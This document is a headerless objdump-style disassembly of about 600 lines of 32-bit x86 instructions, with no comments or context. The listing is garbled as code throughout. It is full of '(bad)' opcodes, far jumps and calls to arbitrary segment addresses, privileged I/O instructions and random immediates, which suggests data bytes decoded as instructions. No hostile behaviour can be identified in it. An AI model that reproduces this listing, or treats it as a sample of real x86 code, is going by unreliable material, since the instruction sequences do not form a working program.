  449aca:	sbb    dh,BYTE PTR [edx-0x4c38ea53]
  449ad0:	cli    
  449ad1:	add    al,BYTE PTR [eax-0x3a]
  449ad4:	jge    0x449b1d
  449ad6:	fcom   DWORD PTR [ebp+0x2b7c09fe]
  449adc:	mov    bh,BYTE PTR cs:[ebp+0x15]
  449ae0:	shl    esp,cl
  449ae2:	sbb    ebx,esi
  449ae4:	pop    ds
  449ae5:	add    ecx,DWORD PTR [eax-0x5c]
  449ae8:	pop    edx
  449ae9:	rcl    DWORD PTR [ecx],cl
  449aeb:	aad    0xb6
  449aed:	jmp    0xf612:0x14331b65
  449af4:	mov    bl,0x72
  449af6:	mov    cl,0x27
  449af8:	cwde   
  449af9:	add    eax,0x3e8465e2
  449afe:	das    
  449aff:	xchg   ebx,eax
  449b00:	ds (bad) 
  449b02:	pusha  
  449b03:	inc    ecx
  449b04:	sub    DWORD PTR [edi-0x53443436],esi
  449b0a:	je     0x449ace
  449b0c:	pop    es
  449b0d:	add    eax,DWORD PTR [esi]
  449b0f:	push   0xd15fecf6
  449b14:	dec    ebp
  449b15:	cwde   
  449b16:	or     BYTE PTR [edi-0x3c9eff86],bl
  449b1c:	lods   al,BYTE PTR ds:[esi]
  449b1d:	mov    esi,0x7a6dbf51
  449b22:	xlat   BYTE PTR ds:[ebx]
  449b23:	outs   dx,BYTE PTR ds:[esi]
  449b24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449b25:	add    bh,BYTE PTR [eax+eiz*1+0x3]
  449b29:	or     DWORD PTR [ebx+0x69],esi
  449b2c:	add    ch,BYTE PTR [esi-0x45]
  449b2f:	test   eax,0xb98f34f1
  449b34:	mov    ecx,0xe795beb9
  449b39:	push   es
  449b3a:	jmp    0xcc4a63a3
  449b3f:	arpl   WORD PTR [ebp-0x6e7864e3],si
  449b45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  449b46:	pop    esp
  449b47:	cmc    
  449b48:	ret    
  449b49:	lods   eax,DWORD PTR ds:[esi]
  449b4a:	loopne 0x449b45
  449b4c:	xchg   BYTE PTR [esi+0x5fafe54],dl
  449b52:	in     al,dx
  449b53:	mov    esp,0xe67e01ad
  449b58:	popf   
  449b59:	push   eax
  449b5a:	ins    BYTE PTR es:[edi],dx
  449b5b:	lea    edx,[edx]
  449b5d:	js     0x449b2b
  449b5f:	icebp  
  449b60:	dec    eax
  449b61:	jbe    0x449b96
  449b63:	aas    
  449b64:	add    dl,BYTE PTR [bp+si]
  449b67:	sbb    BYTE PTR [ebx+ecx*1+0x7b],ah
  449b6b:	mov    al,ds:0xb11e6950
  449b70:	xchg   esi,eax
  449b71:	inc    ecx
  449b72:	mov    dh,0x8b
  449b74:	call   0x2e9:0x55d5e512
  449b7b:	mov    al,ds:0xf431f8ac
  449b80:	mov    BYTE PTR [edi-0x314bf872],cl
  449b86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449b87:	add    BYTE PTR es:[esi-0x7a77bb17],cl
  449b8e:	xor    cl,ah
  449b90:	mov    WORD PTR [ecx],fs
  449b92:	add    esi,DWORD PTR [ecx]
  449b94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449b95:	stc    
  449b96:	inc    eax
  449b97:	inc    eax
  449b98:	fist   WORD PTR [esp+eax*2]
  449b9b:	ficom  WORD PTR [edx]
  449b9d:	xchg   esp,eax
  449b9e:	stc    
  449b9f:	pop    eax
  449ba0:	or     DWORD PTR [ecx-0x235e23ff],esi
  449ba6:	jle    0x449bcd
  449ba8:	fst    QWORD PTR [ebx]
  449baa:	iret   
  449bab:	adc    BYTE PTR [edi-0x16],bh
  449bae:	loope  0x449bc4
  449bb0:	inc    esp
  449bb1:	int3   
  449bb2:	cmp    dl,bh
  449bb4:	cmc    
  449bb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449bb6:	call   0xd7271206
  449bbb:	or     eax,0x147d5988
  449bc0:	push   0xc0e1221e
  449bc5:	add    DWORD PTR [eax-0x4149fbdd],ebx
  449bcb:	cmp    al,0x48
  449bcd:	lock dec ebp
  449bcf:	das    
  449bd0:	mov    bl,bh
  449bd2:	aas    
  449bd3:	sub    BYTE PTR [edx-0xd],cl
  449bd6:	cld    
  449bd7:	push   ebx
  449bd8:	std    
  449bd9:	pop    ds
  449bda:	mov    DWORD PTR fs:[esi-0x3693ed34],esi
  449be1:	pop    edx
  449be2:	loopne 0x449c03
  449be4:	xchg   BYTE PTR [ecx-0x150fd498],cl
  449bea:	ror    al,0x0
  449bed:	mov    bh,0x16
  449bef:	xchg   ebp,eax
  449bf0:	and    BYTE PTR [ebx-0x3fdac7e3],al
  449bf6:	mov    al,ds:0xd111f6d9
  449bfb:	push   edi
  449bfc:	mov    ah,0xe9
  449bfe:	or     al,BYTE PTR [ebx+0x51942e89]
  449c04:	and    al,bl
  449c06:	jp     0x449bc1
  449c08:	pop    esp
  449c09:	popa   
  449c0a:	mul    dh
  449c0c:	or     BYTE PTR [eax+eiz*8],cl
  449c0f:	and    al,0x61
  449c11:	aam    0x1f
  449c13:	pop    es
  449c14:	adc    esi,DWORD PTR [ecx+esi*1]
  449c17:	cld    
  449c18:	sbb    ecx,DWORD PTR ds:[eax-0x2c]
  449c1c:	aaa    
  449c1d:	mov    bh,0xd
  449c1f:	add    ch,dh
  449c21:	icebp  
  449c22:	icebp  
  449c23:	ror    BYTE PTR [ebx-0x4f214d0b],cl
  449c29:	pop    esi
  449c2a:	mov    esp,0x987378ec
  449c2f:	aad    0x0
  449c31:	jge    0x449c66
  449c33:	push   ebx
  449c34:	test   al,0x31
  449c36:	push   0xffffffd1
  449c38:	xchg   bh,dh
  449c3a:	cli    
  449c3b:	mov    esp,0x22bfc344
  449c40:	in     al,0x19
  449c42:	sti    
  449c43:	aad    0x6
  449c45:	jae    0x449c0e
  449c47:	(bad)  
  449c48:	and    BYTE PTR [ebx+0x11],0x7f
  449c4c:	mov    BYTE PTR [ebx+0x2e],dh
  449c4f:	push   0x57
  449c51:	outs   dx,BYTE PTR ds:[esi]
  449c52:	mov    cl,0x8e
  449c54:	adc    al,BYTE PTR [edx]
  449c56:	and    al,0x7a
  449c58:	loope  0x449c2c
  449c5a:	mov    WORD PTR [ecx+0x1b608b6a],cs
  449c60:	cld    
  449c61:	aaa    
  449c62:	stc    
  449c63:	add    al,0xde
  449c65:	sub    BYTE PTR ss:[ebx+0x46e8130a],bh
  449c6c:	or     esp,edx
  449c6e:	jge    0x449ce3
  449c70:	lahf   
  449c71:	clc    
  449c72:	pop    ds
  449c73:	mov    bh,0xbb
  449c75:	mov    bh,bl
  449c77:	rcr    BYTE PTR [edi+0x17de7de9],0x1d
  449c7e:	pusha  
  449c7f:	push   0x335561b0
  449c84:	sbb    BYTE PTR [ecx-0x6d],bl
  449c87:	or     cl,BYTE PTR [ebx-0x6e9d171]
  449c8d:	int    0xc3
  449c8f:	mov    bh,0x12
  449c91:	jg     0x449cd1
  449c93:	mov    bl,0x1f
  449c95:	add    eax,DWORD PTR [edx]
  449c97:	pop    edx
  449c98:	sti    
  449c99:	sahf   
  449c9a:	jmp    0x5f01:0x1e2e6aa2
  449ca1:	cli    
  449ca2:	xor    BYTE PTR [esi],dh
  449ca4:	(bad)  
  449ca5:	push   0xffffffdf
  449ca7:	aam    0xe8
  449ca9:	(bad)  
  449cab:	scas   al,BYTE PTR es:[edi]
  449cac:	xor    BYTE PTR [ecx+eiz*8-0x52cc3897],dl
  449cb3:	or     al,0x65
  449cb5:	sbb    al,dh
  449cb7:	jecxz  0x449d09
  449cb9:	xor    DWORD PTR [edx+ebx*2+0x6c],0xffffff9b
  449cbe:	pop    ds
  449cbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449cc0:	repz and al,0x5f
  449cc3:	jno    0x449d09
  449cc5:	(bad)  
  449cc6:	pushf  
  449cc7:	aam    0x18
  449cc9:	ja     0x449d36
  449ccb:	and    ecx,DWORD PTR [ecx]
  449ccd:	loop   0x449d02
  449ccf:	in     eax,0x80
  449cd1:	stc    
  449cd2:	enter  0xa044,0x2d
  449cd6:	xchg   esp,eax
  449cd7:	aam    0x8a
  449cd9:	das    
  449cda:	ret    0x847e
  449cdd:	cmp    BYTE PTR [edi],bl
  449cdf:	jns    0x449d39
  449ce1:	and    BYTE PTR [edx+0x79b080ca],0xd4
  449ce8:	repz cld 
  449cea:	inc    esi
  449ceb:	and    DWORD PTR [ecx-0x761f4cfd],ebx
  449cf1:	pop    edi
  449cf2:	push   esp
  449cf3:	sbb    bh,BYTE PTR [edx+0x36ed5948]
  449cf9:	add    esi,DWORD PTR [eax-0x6f87ee89]
  449cff:	mov    bl,0xdb
  449d01:	and    BYTE PTR [esi],bl
  449d03:	dec    ebp
  449d04:	xchg   BYTE PTR [ecx],dh
  449d06:	(bad)  
  449d07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  449d08:	push   0xffffff84
  449d0a:	xchg   dl,dl
  449d0c:	test   DWORD PTR [ebx+0x55],0x66c3ae34
  449d13:	mov    cs,WORD PTR [edx-0x17]
  449d16:	into   
  449d17:	and    eax,0x1d1f3409
  449d1c:	jbe    0x449d64
  449d1e:	sti    
  449d1f:	jbe    0x449cab
  449d21:	aam    0x5f
  449d23:	aam    0x6b
  449d25:	pop    ebp
  449d26:	jne    0x449ce7
  449d28:	into   
  449d29:	sub    DWORD PTR [ebp-0x42],edi
  449d2c:	dec    ebx
  449d2d:	jmp    0x449da3
  449d2f:	out    dx,eax
  449d30:	mov    BYTE PTR [edi],dl
  449d32:	dec    edx
  449d33:	lods   eax,DWORD PTR ds:[esi]
  449d34:	inc    edi
  449d35:	dec    ebx
  449d36:	sub    BYTE PTR ds:0x334c020d,0xe4
  449d3d:	mov    eax,DWORD PTR [edi+eiz*8]
  449d40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449d41:	xchg   BYTE PTR [eax-0x1f],ah
  449d44:	aaa    
  449d45:	inc    ebx
  449d46:	jbe    0x449d5a
  449d48:	(bad)  
  449d49:	cli    
  449d4a:	add    dl,bh
  449d4c:	(bad)  
  449d4d:	jle    0x449da3
  449d4f:	ins    BYTE PTR es:[edi],dx
  449d50:	adc    dl,0x90
  449d53:	cdq    
  449d54:	adc    DWORD PTR [edi+0x77003517],0x61
  449d5b:	addr16 mov bl,0x3f
  449d5e:	and    al,0xc6
  449d60:	adc    BYTE PTR ds:0x668ad467,ah
  449d66:	push   ss
  449d67:	jl     0x449ddc
  449d69:	mov    bl,0x99
  449d6b:	adc    BYTE PTR [ebp-0x259bb1b9],0x2
  449d72:	and    al,0x16
  449d74:	pop    edx
  449d75:	add    al,0x38
  449d77:	aam    0xed
  449d79:	arpl   WORD PTR ds:0xff801791,si
  449d7f:	js     0x449d73
  449d81:	mov    DWORD PTR [esp+edx*8],ebp
  449d84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449d85:	mov    BYTE PTR [edi+eiz*8-0x6c],bl
  449d89:	mov    ds:0xbde3d727,al
  449d8e:	cli    
  449d8f:	push   ss
  449d90:	gs push esi
  449d92:	bnd jg 0x449d1d
  449d95:	lods   eax,DWORD PTR ds:[esi]
  449d96:	fs inc ecx
  449d98:	lods   al,BYTE PTR ds:[esi]
  449d99:	fisub  WORD PTR [eax+eiz*4-0x5a]
  449d9d:	add    ah,BYTE PTR [ecx+ecx*1]
  449da0:	jbe    0x449deb
  449da2:	scas   al,BYTE PTR es:[edi]
  449da3:	cli    
  449da4:	or     bl,dh
  449da6:	pop    ebx
  449da7:	in     eax,0xec
  449da9:	dec    esp
  449daa:	pop    ds
  449dab:	jge    0x449dbb
  449dad:	push   ss
  449dae:	(bad)  
  449daf:	push   0xd5a2ef0c
  449db4:	popf   
  449db5:	fs retf 
  449db7:	add    eax,DWORD PTR [eax+0x17]
  449dba:	in     eax,dx
  449dbb:	jg     0x449d43
  449dbd:	int    0x3
  449dbf:	pop    DWORD PTR [eax]
  449dc1:	popa   
  449dc2:	inc    BYTE PTR [eax-0x51]
  449dc5:	jge    0x449d5a
  449dc7:	pop    ecx
  449dc8:	test   eax,0x565c1f62
  449dcd:	fst    QWORD PTR [esi-0x15]
  449dd0:	and    eax,0x31811fee
  449dd5:	jbe    0x449dd9
  449dd7:	adc    DWORD PTR [ecx+0x52],edi
  449dda:	inc    ebx
  449ddb:	pop    esp
  449ddc:	mov    cl,0xa
  449dde:	pop    ds
  449ddf:	rol    BYTE PTR [eax],1
  449de1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  449de2:	xchg   esp,eax
  449de3:	add    al,0xc6
  449de5:	pop    es
  449de6:	outs   dx,BYTE PTR ds:[esi]
  449de7:	outs   dx,DWORD PTR ds:[esi]
  449de8:	shl    DWORD PTR [edi],0xd5
  449deb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449dec:	dec    eax
  449ded:	arpl   di,si
  449def:	dec    DWORD PTR [ebx+0x3]
  449df2:	lods   al,BYTE PTR ds:[esi]
  449df3:	mov    al,ds:0xd9559125
  449df8:	std    
  449df9:	fbld   TBYTE PTR [eax+0x5d]
  449dfc:	push   ecx
  449dfd:	pop    ss
  449dfe:	nop
  449dff:	add    al,0x24
  449e01:	mov    cl,BYTE PTR [edx+0x7e02b8f0]
  449e07:	in     al,dx
  449e08:	cmc    
  449e09:	mov    esi,0x88a13052
  449e0e:	pop    ds
  449e0f:	sbb    DWORD PTR [edx-0x31],0xcbae4381
  449e16:	dec    ebp
  449e17:	aam    0xb9
  449e19:	pop    ds
  449e1a:	aaa    
  449e1b:	setle  BYTE PTR [ebx]
  449e1e:	adc    eax,0x2ecbb132
  449e23:	cmp    BYTE PTR [eax],cl
  449e25:	jo     0x449dba
  449e27:	(bad)  
  449e28:	push   cs
  449e29:	adc    ah,bh
  449e2b:	mov    bl,0x18
  449e2d:	hlt    
  449e2e:	mul    ecx
  449e30:	mov    bl,bl
  449e32:	pop    edx
  449e33:	rol    DWORD PTR [ebp+0x6ec60968],cl
  449e39:	sbb    DWORD PTR [esi],eax
  449e3b:	je     0x449e6b
  449e3d:	sub    bh,BYTE PTR [edx]
  449e3f:	push   edi
  449e40:	js     0x449dd0
  449e42:	rol    DWORD PTR [ecx-0x77],cl
  449e45:	mov    bl,0x92
  449e47:	icebp  
  449e48:	bound  edx,QWORD PTR [ecx+0x5c]
  449e4b:	add    BYTE PTR [esp+ebp*1-0x23e3d53e],0x62
  449e53:	aaa    
  449e54:	add    al,0xc7
  449e56:	mov    cl,ch
  449e58:	cmp    bh,BYTE PTR [ecx+0x34eba17d]
  449e5e:	sub    eax,0x7fc7e7a5
  449e63:	out    0x62,al
  449e65:	fadd   DWORD PTR [edi+edx*8]
  449e68:	leave  
  449e69:	xor    eax,0xbc9d89e3
  449e6e:	sti    
  449e6f:	push   es
  449e70:	mov    BYTE PTR [ebx+0x6f],bh
  449e73:	push   ebp
  449e74:	push   es
  449e75:	stos   DWORD PTR es:[edi],eax
  449e76:	jle    0x449e37
  449e78:	stos   DWORD PTR es:[edi],eax
  449e79:	add    bh,dh
  449e7b:	ds daa 
  449e7d:	push   edx
  449e7e:	dec    ecx
  449e7f:	stos   DWORD PTR es:[edi],eax
  449e80:	add    edi,edi
  449e82:	jge    0x449e65
  449e84:	(bad)  
  449e85:	and    DWORD PTR [ebx+0xcc8e614],ecx
  449e8b:	out    0xaa,eax
  449e8d:	add    al,BYTE PTR [esi+0x6b4b5df]
  449e93:	pop    eax
  449e94:	popf   
  449e95:	(bad)  
  449e96:	or     al,0x4b
  449e98:	push   0x6c711fac
  449e9d:	mov    bh,0x72
  449e9f:	es data16 adc BYTE PTR gs:[esi+0xa],al
  449ea5:	mov    fs,WORD PTR [eax-0x53]
  449ea8:	data16 (bad) 
  449eaa:	sar    BYTE PTR [edx],1
  449eac:	dec    esi
  449ead:	fwait
  449eae:	push   es
  449eaf:	mov    al,ds:0x4355c789
  449eb4:	push   esi
  449eb5:	pop    ds
  449eb6:	cmp    BYTE PTR ds:0xa6e202ae,dl
  449ebc:	cmp    bl,BYTE PTR [ebx+0x0]
  449ebf:	jmp    0xc097:0xdf60deb9
  449ec6:	ror    DWORD PTR ds:0xd4ae5cf6,0x46
  449ecd:	test   al,0x6
  449ecf:	je     0x449f04
  449ed1:	bnd jg 0x449e71
  449ed4:	xchg   DWORD PTR ds:0xa5d41433,esp
  449eda:	sbb    al,0x97
  449edc:	scas   al,BYTE PTR es:[edi]
  449edd:	mov    BYTE PTR [ebp+0xe],ch
  449ee0:	rol    BYTE PTR ds:0xf1c90752,1
  449ee6:	cld    
  449ee7:	xor    bh,BYTE PTR [edi-0x67]
  449eea:	pop    ebp
  449eeb:	sti    
  449eec:	ror    BYTE PTR [edi-0x61],0x98
  449ef0:	jnp    0x449ed0
  449ef2:	imul   edi,DWORD PTR [esi],0x902c0590
  449ef8:	push   ebx
  449ef9:	lahf   
  449efa:	rol    BYTE PTR [ecx+0xb1e6d2c],cl
  449f00:	adc    cl,cl
  449f02:	jne    0x449e88
  449f04:	div    BYTE PTR ds:0x8882bbc9
  449f0a:	dec    esp
  449f0b:	stos   BYTE PTR es:[edi],al
  449f0c:	iret   
  449f0d:	stos   DWORD PTR es:[edi],eax
  449f0e:	push   ebp
  449f0f:	sub    DWORD PTR [esi+0x63],eax
  449f12:	int    0xf3
  449f14:	cmc    
  449f15:	jmp    0x6466:0x6bb0f610
  449f1c:	mov    DWORD PTR [ebx+ebp*2-0x20a2c875],ebp
  449f23:	sbb    al,0x61
  449f25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  449f26:	pop    ds
  449f27:	fldcw  WORD PTR [ebp+0x649b17b5]
  449f2d:	dec    di
  449f2f:	int3   
  449f30:	mov    bl,al
  449f32:	xor    BYTE PTR [ebx-0x69],0x42
  449f36:	dec    ebx
  449f37:	dec    edx
  449f38:	and    eax,0x9117e802
  449f3d:	jb     0x449ee8
  449f3f:	and    DWORD PTR [ecx],0xffffffa1
  449f42:	pop    ds
  449f43:	emms   
  449f45:	and    ah,BYTE PTR [eax+0x1b]
  449f48:	cwde   
  449f49:	out    dx,eax
  449f4a:	dec    edx
  449f4b:	stos   BYTE PTR es:[edi],al
  449f4c:	xchg   ebx,eax
  449f4d:	sbb    edi,DWORD PTR [esi-0x14]
  449f50:	fwait
  449f51:	inc    ebp
  449f52:	and    DWORD PTR [ebx],esi
  449f54:	ficomp WORD PTR [ebx+0x1e]
  449f57:	pop    ebp
  449f58:	cs aaa 
  449f5a:	aam    0x9f
  449f5c:	aaa    
  449f5d:	inc    ebx
  449f5e:	jge    0x449fc9
  449f60:	cld    
  449f61:	mov    eax,0x491f9df4
  449f66:	loop   0x449f45
  449f68:	mov    DWORD PTR [ebp-0x6],ebp
  449f6b:	mov    ebp,0xa8d20f7
  449f70:	mov    BYTE PTR [edi],dl
  449f72:	jl     0x449f83
  449f74:	adc    esi,0x1408d88
  449f7a:	loopne 0x449f58
  449f7c:	loop   0x449fd7
  449f7e:	(bad)  
  449f7f:	sbb    eax,DWORD PTR [edi-0x25]
  449f82:	mov    bh,BYTE PTR [eax]
  449f84:	adc    BYTE PTR [esi+0x6a0ed4a7],cl
  449f8a:	cmp    eax,0x7564e5ef
  449f8f:	test   DWORD PTR [ebx],edi
  449f91:	mov    ch,BYTE PTR [edi+0x4d]
  449f94:	mov    DWORD PTR [esi],esp
  449f96:	dec    eax
  449f97:	outs   dx,DWORD PTR ds:[esi]
  449f98:	jge    0x449fc2
  449f9a:	inc    esp
  449f9b:	push   ss
  449f9c:	mov    DWORD PTR [edi],eax
  449f9e:	loopne 0x449ffb
  449fa0:	stc    
  449fa1:	pop    eax
  449fa2:	jne    0x44a016
  449fa4:	jne    0x449fa8
  449fa6:	scas   al,BYTE PTR es:[edi]
  449fa7:	push   edx
  449fa8:	pop    ebx
  449fa9:	mov    ss,WORD PTR [edx+ecx*1+0x2b]
  449fad:	lods   eax,DWORD PTR ds:[esi]
  449fae:	pusha  
  449faf:	leave  
  449fb0:	mov    esp,0x91075465
  449fb5:	retf   0xc313
  449fb8:	out    0x17,eax
  449fba:	sub    cl,BYTE PTR [ebp+0x7412c2a8]
  449fc0:	or     al,BYTE PTR [ecx+0x6d948baf]
  449fc6:	fld    TBYTE PTR [eax-0x77d8ba49]
  449fcc:	pop    edx
  449fcd:	mov    eax,es:0x6c7b75d5
  449fd3:	sbb    bl,BYTE PTR [ebp-0x16]
  449fd6:	cmp    al,BYTE PTR [ebx-0x20e1bd8f]
  449fdc:	ja     0x449fdd
  449fde:	push   edx
  449fdf:	inc    edx
  449fe0:	call   0xfb194d6a
  449fe5:	cmp    esp,edi
  449fe7:	dec    esi
  449fe8:	sub    ebx,esi
  449fea:	mov    ebp,0x3b93898b
  449fef:	pushf  
  449ff0:	xor    ch,al
  449ff2:	in     al,dx
  449ff3:	test   al,0x95
  449ff5:	add    dh,BYTE PTR [eax]
  449ff7:	pop    esp
  449ff8:	jg     0x44a068
  449ffa:	jbe    0x44a06b
  449ffc:	scas   al,BYTE PTR es:[edi]
  449ffd:	clc    
  449ffe:	xor    BYTE PTR [ebp+0x48],bh
  44a001:	adc    DWORD PTR [edi],ebx
  44a003:	jmp    0x449fac
  44a005:	push   ss
  44a006:	and    eax,0x10e4d697
  44a00b:	aam    0xe0
  44a00d:	add    esp,DWORD PTR [ecx-0x55]
  44a010:	cld    
  44a011:	sbb    BYTE PTR [edi],bh
  44a013:	in     al,dx
  44a014:	mov    ebx,ebp
  44a016:	jle    0x44a01c
  44a018:	jb     0x44a038
  44a01a:	shl    DWORD PTR [ecx+0x71a202b4],1
  44a020:	lahf   
  44a021:	push   cs
  44a022:	jmp    0xef8d8776
  44a027:	mov    DWORD PTR [ebp-0x683dbbfe],esi
  44a02d:	adc    edx,DWORD PTR [edx+0x5c]
  44a030:	mov    ebx,0xfeeac202
  44a035:	sbb    eax,0xa70337d0
  44a03a:	pusha  
  44a03b:	fbstp  TBYTE PTR [ecx]
  44a03d:	(bad)  
  44a03e:	push   0x5f2c3850
  44a043:	aad    0x5
  44a045:	sbb    al,0x9e
  44a047:	pop    ebp
  44a048:	ret    0x41c3
  44a04b:	dec    eax
  44a04c:	ja     0x44a05a
  44a04e:	fs add ebx,ebp
  44a051:	les    edi,FWORD PTR [esi-0x42]
  44a054:	div    dl
  44a056:	outs   dx,BYTE PTR ds:[esi]
  44a057:	in     eax,0x6a
  44a059:	add    ah,BYTE PTR [esi]
  44a05b:	jns    0x44a099
  44a05d:	imul   ecx,DWORD PTR [edx+0x60d1496c],0xffffffb1
  44a064:	dec    ecx
  44a065:	jbe    0x44a087
  44a067:	pop    edx
  44a068:	inc    edx
  44a069:	inc    ebp
  44a06a:	(bad)  
  44a06b:	aad    0x7d
  44a06d:	jecxz  0x44a029
  44a06f:	xchg   BYTE PTR [ebx-0x75],dh
  44a072:	jecxz  0x44a054
  44a074:	popa   
  44a075:	sbb    BYTE PTR [edi],dh
  44a077:	xchg   ecx,eax
  44a078:	mov    DWORD PTR [ebx+0x6dc848ed],esp
  44a07e:	loopne 0x44a0d3
  44a080:	and    al,0x3
  44a082:	push   cs
  44a083:	mov    ds:0x25f96632,al
  44a088:	xchg   ecx,eax
  44a089:	inc    esp
  44a08a:	pop    ds
  44a08b:	xchg   edi,eax
  44a08c:	push   esi
  44a08d:	dec    esp
  44a08e:	sahf   
  44a08f:	add    ah,BYTE PTR [eax+0x1d]
  44a092:	popa   
  44a093:	aad    0x29
  44a095:	xchg   esi,eax
  44a096:	out    0xb2,eax
  44a098:	jae    0x44a0a8
  44a09a:	aaa    
  44a09b:	and    edx,DWORD PTR [ebp-0x6b46f4bf]
  44a0a1:	pop    eax
  44a0a2:	pop    ss
  44a0a3:	mov    BYTE PTR [ecx],cl
  44a0a5:	sbb    ebp,DWORD PTR [eax]
  44a0a7:	cmc    
  44a0a8:	jp     0x44a0ad
  44a0aa:	call   0x3f28:0xb47eb71b
  44a0b1:	lock pop ds
  44a0b3:	imul   ebp,DWORD PTR [eax+0x1a],0x63
  44a0b7:	mov    bh,0x64
  44a0b9:	jno    0x44a0d9
  44a0bb:	aam    0x9a
  44a0bd:	sbb    eax,0xf5b05a12
  44a0c2:	mov    ebp,0x4cf797a9
  44a0c7:	dec    ecx
  44a0c8:	cmp    al,0xc2
  44a0ca:	xor    cl,ch
  44a0cc:	add    BYTE PTR [edx-0x40d45ae2],dh
  44a0d2:	(bad)  
  44a0d3:	cs enter 0xca42,0x53
  44a0d8:	push   esi
  44a0d9:	(bad)  
  44a0da:	push   ss
  44a0db:	sub    al,0xe9
  44a0dd:	ja     0x44a064
  44a0df:	loopne 0x44a0a3
  44a0e1:	addr16 cmp al,0xd7
  44a0e4:	test   al,0xe2
  44a0e6:	add    ecx,DWORD PTR [ecx]
  44a0e8:	inc    eax
  44a0e9:	gs out 0x33,eax
  44a0ec:	mov    ebx,ebp
  44a0ee:	and    DWORD PTR [esi+0x660ef52b],ebx
  44a0f4:	loop   0x44a0f8
  44a0f6:	xor    WORD PTR [edi+0x7d],si
  44a0fa:	into   
  44a0fb:	cs arpl bx,bp
  44a0fe:	mov    esp,0x60ac9487
  44a103:	repz mov ah,0x14
  44a106:	addr16 dec esi
  44a108:	jo     0x44a10d
  44a10a:	je     0x44a09e
  44a10c:	xor    ecx,edx
  44a10e:	stos   BYTE PTR es:[edi],al
  44a10f:	nop
  44a110:	out    dx,al
  44a111:	popf   
  44a112:	pusha  
  44a113:	inc    ecx
  44a114:	xor    ebx,DWORD PTR [ecx+0x3c9425cc]
  44a11a:	pop    ebp
  44a11b:	rol    DWORD PTR [ebp+edi*8+0x4fa95ec],cl
  44a122:	push   esi
  44a123:	push   edx
  44a124:	cmp    BYTE PTR [ebx+0x5f],bh
  44a127:	add    cl,BYTE PTR [eax-0x4a4f0677]
  44a12d:	mov    ebx,eax
  44a12f:	add    eax,DWORD PTR [eax]
  44a131:	add    al,BYTE PTR [eax]
  44a133:	sbb    DWORD PTR [esi+edx*1+0x7101a6c6],edi
  44a13a:	gs das 
  44a13c:	xor    eax,0x6110b9be
  44a141:	shr    BYTE PTR [edi+eax*2],1
  44a144:	inc    eax
  44a145:	loope  0x44a0e6
  44a147:	aad    0xdc
  44a149:	dec    BYTE PTR [esi]
  44a14b:	das    
  44a14c:	jae    0x44a136
  44a14e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44a14f:	or     BYTE PTR [ecx-0xd880d89],0xb6
  44a156:	rol    ch,0xa2
  44a159:	add    cl,BYTE PTR [ebx+eiz*8-0x22]
  44a15d:	int    0x84
  44a15f:	aaa    
  44a160:	mov    BYTE PTR [edx-0x12644ca0],ah
  44a166:	and    BYTE PTR [ebx],bh
  44a168:	inc    ebp
  44a169:	add    DWORD PTR [edx+0x4],edi
  44a16c:	shl    dh,cl
  44a16e:	pop    ds
  44a16f:	stos   DWORD PTR es:[edi],eax
  44a170:	call   0x69ca1bf1
  44a175:	clc    
  44a176:	jge    0x44a193
  44a178:	je     0x44a1e8
  44a17a:	and    BYTE PTR [eax],bh
  44a17c:	stc    
  44a17d:	imul   eax,DWORD PTR [esi-0x2b],0x8092efa5
  44a184:	jo     0x44a188
  44a186:	add    BYTE PTR [ebp+0x2b],dh
  44a189:	inc    ecx
  44a18a:	or     cl,dl
  44a18c:	retf   
  44a18d:	cld    
  44a18e:	pusha  
  44a18f:	jnp    0x44a1d9
  44a191:	das    
  44a192:	push   ss
  44a193:	mov    ebx,0xf9f925c3
  44a198:	dec    DWORD PTR [ebp-0x5b2a8da0]
  44a19e:	jns    0x44a179
  44a1a0:	mov    BYTE PTR [ebx],ch
  44a1a2:	xchg   ecx,eax
  44a1a3:	xchg   edx,eax
  44a1a4:	das    
  44a1a5:	sti    
  44a1a6:	mov    al,ds:0x429dda3
  44a1ab:	sub    ch,dl
  44a1ad:	out    dx,eax
  44a1ae:	adc    BYTE PTR [edi+0x11f923a],dh
  44a1b4:	mov    eax,ds:0x7efb7e6c
  44a1b9:	adc    ah,bh
  44a1bb:	sar    BYTE PTR [ebx],cl
  44a1bd:	cmp    DWORD PTR [ebx+0x30df484b],eax
  44a1c3:	lahf   
  44a1c4:	aaa    
  44a1c5:	lock pop ds
  44a1c7:	ja     0x44a167
  44a1c9:	cli    
  44a1ca:	sbb    eax,0x7c5dca0e
  44a1cf:	aam    0xe4
  44a1d1:	jmp    FWORD PTR [edx+0x185253e3]
  44a1d7:	call   0xf7c1c764
  44a1dc:	jne    0x44a1c4
  44a1de:	popf   
  44a1df:	rcr    DWORD PTR [ecx-0x75aa8be4],1
  44a1e5:	repz fadd DWORD PTR ds:0x7fa83ce9
  44a1ec:	mov    BYTE PTR [ebx],dl
  44a1ee:	add    edx,DWORD PTR [esi-0x3f]
  44a1f1:	pop    ds
  44a1f2:	jecxz  0x44a1b1
  44a1f4:	inc    esp
  44a1f5:	mov    ds:0x47b6018b,al
  44a1fa:	adc    al,0xd3
  44a1fc:	addr16 xor esi,0xffffffb1
  44a200:	sbb    al,0xc7
  44a202:	loopne 0x44a1bb
  44a204:	mov    DWORD PTR [edi-0x5cadd705],edx
  44a20a:	sbb    bl,BYTE PTR [esi-0x3e377a47]
  44a210:	xor    al,0xc2
  44a212:	xor    eax,0xd91b8b4a
  44a217:	aas    
  44a218:	fs mov edi,0xcc498050
  44a21e:	and    eax,0x1fd71658
  44a223:	outs   dx,BYTE PTR ds:[esi]
  44a224:	test   eax,0x56549b57
  44a229:	sub    DWORD PTR [esi],ebx
  44a22b:	mov    bh,0x9b
  44a22d:	jb     0x44a258
  44a22f:	dec    ebp
  44a230:	stc    
  44a231:	pop    edi
  44a232:	ficomp WORD PTR [esi+0x24]
